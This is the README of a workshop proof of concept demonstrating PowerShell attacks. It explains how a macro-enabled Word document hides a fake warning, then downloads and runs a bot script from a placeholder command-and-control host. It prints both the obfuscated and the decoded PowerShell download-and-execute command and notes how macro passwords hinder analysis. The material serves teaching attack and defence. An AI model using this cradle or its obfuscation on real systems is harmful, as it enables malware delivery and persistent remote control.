# powershell\_cnc
Accompanies the Attack and Defend with Powershell workshop.  A simplified POC demoing Powershell attack methods.


# Word Document:
Open the macro using password "Password1".  Most booby-trapped macro-enabled documents protect their code with a password.  They're trivial to bypass - you can replace the password with a different one using a hex editor.  Still, they provide some layer of protection against curious users and automated analysis software.

The macro uses Document\_Open() to run as soon macros are enabled.  It first hides the fake warning message using    Shape.Visible = False  .  It then connects to the command and control center at http://CNC\_URL, downloads the plain-text bot script, and executes it.   The execution takes place in a new Powershell process.  This way, the connection persists after the Word document is closed.  The encoded command used to connect is a Base64 representation of this obfuscated command:

' "&('{1}{0}'-f'x','iE')((.('{0}{1}{2}{3}'-f[char]110,'eW','-oBj','eCt')('{0}{2}{1}'-f'nEt.WeBC','ENT','Li')).('{1}{0}{2}'-f'adStRin','DownLO',[char]103)(('{1}{2}{2}{3}{0}'-f'\_URL','h',[char]116,'p://CNC')))" which in turn translates to:

Invoke-Expression( (New-Object Net.WebClient).DownloadString('http://CNC\_URL') )
